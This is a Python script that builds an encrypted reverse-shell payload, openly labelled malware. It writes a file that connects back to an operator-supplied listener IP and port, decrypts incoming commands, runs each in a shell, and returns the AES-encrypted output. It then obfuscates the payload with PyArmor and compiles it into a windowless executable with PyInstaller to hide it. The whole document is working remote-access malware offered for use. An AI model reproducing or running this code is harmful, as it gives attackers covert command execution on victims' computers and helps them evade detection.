import os
import base64

# Get user input for host and port
host = input("Enter Listener IP: ").strip()
port = input("Enter Listener Port: ").strip()

# AES Key & IV Generation
aes_key = os.urandom(16)  # 16-byte AES key
iv = os.urandom(16)  # 16-byte IV

# Malware code template
malware_code = f"""
import socket
import subprocess
import time
from Crypto.Cipher import AES
import base64

# AES Encryption Setup
KEY = {list(aes_key)}  # 16-byte key
IV = {list(iv)}

def encrypt(msg):
    cipher = AES.new(bytes(KEY), AES.MODE_CBC, bytes(IV))
    return base64.b64encode(IV + cipher.encrypt(msg.ljust(16))).decode()

def decrypt(enc_msg):
    enc_msg = base64.b64decode(enc_msg)
    iv, enc_msg = enc_msg[:16], enc_msg[16:]
    cipher = AES.new(bytes(KEY), AES.MODE_CBC, iv)
    return cipher.decrypt(enc_msg).strip().decode()

# Connection Setup
HOST = "{host}"
PORT = {port}

def connect():
    for _ in range(20):  # Try for 20 seconds
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((HOST, PORT))

            while True:
                cmd = decrypt(client.recv(1024).decode())  # Receive & decrypt command
                if cmd.lower() == "exit":
                    break
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                client.send(encrypt(output.stdout + output.stderr).encode())  # Encrypt & send response

            client.close()
            break
        except:
            time.sleep(1)  # Wait 1 second before retrying

connect()
"""

# Write the malware file
with open("malware.py", "w") as f:
    f.write(malware_code)

print("[+] Malware script generated: malware.py")

# Obfuscate using PyArmor
os.system("pyarmor obfuscate malware.py")
print("[+] Malware obfuscated successfully!")

# Compile to EXE with PyInstaller
print("[*] Compiling to EXE...")
os.system("pyinstaller --onefile --noconsole --hidden-import Crypto malware.py")
print("[+] EXE Compiled: Check 'dist/malware.exe'")

